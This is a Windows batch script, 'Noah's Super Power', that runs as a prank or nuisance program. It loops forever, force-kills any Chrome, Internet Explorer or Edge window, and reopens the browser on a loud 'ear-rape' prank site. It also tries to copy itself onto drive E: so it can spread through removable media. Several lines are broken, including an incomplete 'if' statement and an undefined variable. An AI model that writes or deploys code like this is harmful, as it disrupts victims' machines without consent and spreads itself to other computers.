:::::::::::::::::::::::::::
::NOAH'S SUPER POWER V1.1::
:::::::::::::::::::::::::::
:: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com

REM *to change webbrowser homepage change the 'url after chrome.exe/iexplore.exe/MicrosoftEdge.exe "ENTER NEW HOMEPAGE URL HERE"'
REM *compatiable with chrome, edge and internet explorer

@echo off
color e
title Noahs Super Power
set /a okay=0
ver >nul
cls

:A
start chrome.exe ""
timeout /nobreak 10
::homepage loops
:loop
cls
if /i "%okay%" EQU "1" goto waitchrome
if /i "%okay%" EQU "2" goto waitie
if /i "%okay%" EQU "3" goto waitedge
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if "%ERRORLEVEL%"=="0" goto yeschrome
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if "%ERRORLEVEL%"=="0" goto yesie
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
if "%ERRORLEVEL%"=="0" goto yesedge

::copying to external drives
if not exist "E:\" goto loop
if exist "E:\verifyed.a"
set /a newsessionid=%random%
echo Please Input File Name (Current)
type "%cd%\%cf%.bat">>"E:\%newsessionid%.bat"
echo.>>"E:\verifyed.a"
goto loop

::open change window location if needed
:yeschrome
taskkill /F /IM chrome.exe
start "Google Chrome" /HIGH chrome.exe "http://ear-rape-website.com"
cls
set /a okay=1
timeout /nobreak 1 >nul
goto loop
:yesie
taskkill /F /IM iexplore.exe /T
start "IExplore" /HIGH iexplore.exe "http://ear-rape-website.com"
cls
set /a okay=2
timeout /nobreak 1 >nul
goto loop
:yesedge
taskkill /F /IM MicrosoftEdge.exe /T
start "IExplore" /HIGH MicrosoftEdge.exe "http://ear-rape-website.com"
cls
set /a okay=3
timeout /nobreak 1 >nul
goto loop

::waits
:waitchrome
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe"
if "%ERRORLEVEL%"=="0" goto waitchrome
timeout /t 0 >nul
set /a okay=0
goto loop
:waitie
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if "%ERRORLEVEL%"=="0" goto waitie
timeout /t 0 >nul
set /a okay=0
goto loop
:waitedge
tasklist /FI "IMAGENAME eq MicrosoftEdge.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
if "%ERRORLEVEL%"=="0" goto waitedge
timeout /t 0 >nul
set /a okay=0
goto loop

::security stuff
:nexi
color c
echo Security Pass Invalid..
timeout /t 0 >nul
exit /B 1
